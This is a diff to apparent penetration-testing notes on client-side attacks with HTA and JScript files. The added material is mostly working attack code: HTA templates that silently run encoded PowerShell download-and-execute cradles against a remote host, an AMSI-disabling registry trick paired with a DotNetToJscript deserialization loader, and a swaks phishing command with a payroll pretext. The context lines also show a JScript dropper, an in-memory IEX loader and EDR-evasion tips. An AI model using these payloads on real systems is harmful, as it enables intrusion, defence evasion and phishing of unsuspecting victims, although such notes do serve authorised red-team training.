@@ -55,6 +55,8 @@ fso.GetTempName();
 
 # HTA Template
 
+**Simple**
+
 1. Create a poc.hta:
 ```html
 <html>
@@ -64,6 +66,114 @@ fso.GetTempName();
     var ip = "192.168.45.161";
     var payload = 'curl.exe http://' + ip + '/';
     new ActiveXObject('WScript.Shell').Run(payload, 0, false);
+</script>
+</head>
+<body>
+    <h1>HTA POC</h1>
+    <script>
+        self.close();
+    </script>
+</body>
+</html>
+```
+
+**AV Bypass**
+
+1. Generate the payload:
+```powershell
+PS C:\> $Text = "(new-object system.net.webclient).downloadstring('http://10.10.14.128/amsi.txt') | IEX; (new-object system.net.webclient).downloadstring('http://10.10.14.128/run2.txt') | IEX"
+
+PS C:\> $MyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Text"))
+
+# Alternative
+PS C:\> $Text = "IEX ((new-object net.webclient).downloadstring('http://10.10.14.128/run2.txt'))"
+
+PS C:\> $MyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Text"))
+```
+
+2. Generate the HTA file and host it:
+```html
+<!DOCTYPE html>
+<html>
+<head>
+	<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"
+	CAPTION="no" />
+	<script language="VBScript">
+	Function var_func()
+	Dim var_shell
+	Set var_shell = CreateObject("Wscript.Shell")
+	var_shell.run "powershell.exe -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADIAOAAvAHIAdQBuADIALgB0AHgAdAAnACkAKQA=", 0, true
+	End Function
+	var_func
+	self.close
+	</script>
+</head>
+<body>
+</body>
+</html>
+```
+
+**DotNetToJscript**
+
+For example placing DotNetToJscript generated JS into the HTA with AMSI bypass:
+```html
+<html>
+<head>
+<script>
+	// 1. AMSI Bypass
+    var sh = new ActiveXObject('WScript.Shell');
+	var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+	try{
+		// check if the registry key exists
+		var AmsiEnable = sh.RegRead(key);
+		if(AmsiEnable!=0){
+		throw new Error(1, ''); // if it doesnt exist, throw exception and execute the catch
+		}
+	}catch(e){
+		sh.RegWrite(key, 0, "REG_DWORD"); // disable the AmsiEnable value
+		// cscript.exe -> CLI tool for wscript.exe
+		// -e: scripting engine that will execute the script (jscript.dll GUID)
+		// ScriptFullName: the script file to execute must be the original Jscript and we use this attribute to specify it
+		// window style (0 > hidden)
+		// wait for the script executed by the Run method to be completed
+		sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
+		sh.RegWrite(key, 1, "REG_DWORD");
+		WScript.Quit(1);
+	}
+	
+	// 2. DotNetToJscript payload.js contents:
+	function setversion() {
+	new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
+	}
+	function debug(s) {}
+	function base64ToStream(b) {
+			var enc = new ActiveXObject("System.Text.ASCIIEncoding");
+			var length = enc.GetByteCount_2(b);
+			var ba = enc.GetBytes_4(b);
+			var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
+			ba = transform.TransformFinalBlock(ba, 0, length);
+			var ms = new ActiveXObject("System.IO.MemoryStream");
+			ms.Write(ba, 0, (length / 4) * 3);
+			ms.Position = 0;
+			return ms;
+	}
+	
+	// place the serialized_obj from the generated payload.js
+	var serialized_obj = "...";
+	var entry_class = 'ConsoleApp1.TestClass';
+	
+	try {
+			setversion();
+			var stm = base64ToStream(serialized_obj);
+			var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+			var al = new ActiveXObject('System.Collections.ArrayList');
+			var d = fmt.Deserialize_2(stm);
+			al.Add(undefined);
+			var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
+	
+	} catch (e) {
+		debug(e.message);
+	}
 </script>
 </head>
 <body>
@@ -96,12 +206,20 @@ Parameters
 -a: attachment
 ```
 
+Alternative (better):
+```
+sudo swaks -t paul@dehospital.com --from susan@dehospital.com \      
+  --attach @osep.doc --server mail01.dehospital.com \
+  --body "Please review the attached document." \
+  --header "Subject: Q3 Payroll Report"
+```
+
 ---
 # Basic JScript Dropper (detectable)
 
 A JScript dropper downloads a payload from a remote server and executes it. No Office required — just a `.js` file the victim double-clicks.
 
-```javascript
+```js
 // dropper.js — downloads and executes a payload
 var url = "http://ATTACKER_IP:ATTACKER_PORT/shell.exe"
 var savePath = "C:\\Users\\Public\\shell.exe"
@@ -243,7 +361,7 @@ msf> run
 > [!Warning] OPSEC
 > - The standalone `.exe` is written to disk when executed on the victim. This is detectable by AV and EDR — it's best used as a stepping stone to understand the technique before moving to in-memory approaches (DotNetToJScript or Reflective Runner below).
 > - `VirtualAlloc` with `RWX` (0x40) is the most-flagged memory allocation pattern. In production, allocate with `PAGE_READWRITE` (0x04) first, copy the shellcode, then flip to `PAGE_EXECUTE_READ` (0x20) with `VirtualProtect` before calling `CreateThread`.
-> - The compiled `.exe` will be detected by Windows Defender without additional obfuscation — see [[AV Evasion]] for next steps.
+> - The compiled `.exe` will be detected by Windows Defender without additional obfuscation — see [[Antivirus Evasion]] for next steps.
 
 ---
 # DotNetToJScript - Jscript Shellcode Runner (undetectable)
@@ -472,7 +590,7 @@ $method.Invoke(0, $null)
 **Invoke from JScript** (place in payload.js delivered to the victim):
 ```javascript
 // inmemory_reflective.js — downloads and executes runner.ps1 entirely in memory
-var psCmd = "powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/runner.ps1')"";
+var psCmd = "powershell.exe -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/runner.ps1')\"";
 var shell = new ActiveXObject("WScript.Shell");
 shell.Run(psCmd, 0, false);   // 0 = hidden window, false = don't wait
 ```
@@ -705,5 +823,5 @@ $ python3 -c "import jscencode; open('payload.jse','w').write(jscencode.encode(o
 - [[Client-Side Attacks]] — overview of all client-side initial access vectors
 - [[Phishing with Microsoft Office]] — VBA macro alternative with similar capabilities
 - [[Mark of the Web (MotW)]] — bypassing Windows zone restrictions for delivery
-- [[AV Evasion]] — shellcode obfuscation and AMSI bypass for the .NET/PS payloads
+- [[Antivirus Evasion]] — shellcode obfuscation and AMSI bypass for the .NET/PS payloads
 - [[Pretexting]] — social engineering the victim into running the `.js` file
